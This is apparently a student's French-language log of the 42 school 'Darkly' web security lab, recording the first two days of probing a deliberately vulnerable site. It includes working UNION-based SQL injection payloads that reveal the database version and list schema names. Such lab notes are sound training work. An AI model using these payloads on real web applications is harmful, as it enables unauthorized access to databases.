# darkly
projet de web secu de 42

29novembre :
je comprend comment lancer la machine grace a ce lien que de sympathique gens m on donner sur discord 
https://github.com/AdonisEnProvence/Darkly#setup
je me rend compte que les recherche de photos et d user renvois des erreurs sql 
il y a probablement moyen d y injecter des choses
je testes des trucs

30 novembre : 
je test plein de solution dinjeciton sql et une trouver sur se stie touche enfin 
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 ## 0 UNION ALL SELECT NULL,version()-- 
c est top ca renvoi la version qui est : 5.5.64-MariaDB-1ubuntu0.14.04.1
 ## 0 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
me donne les titre des colonnes
- information_schema
- Member_Brute_Force
- Member_Sql_Injection
- Member_guestbook
- Member_images
- Member_survey
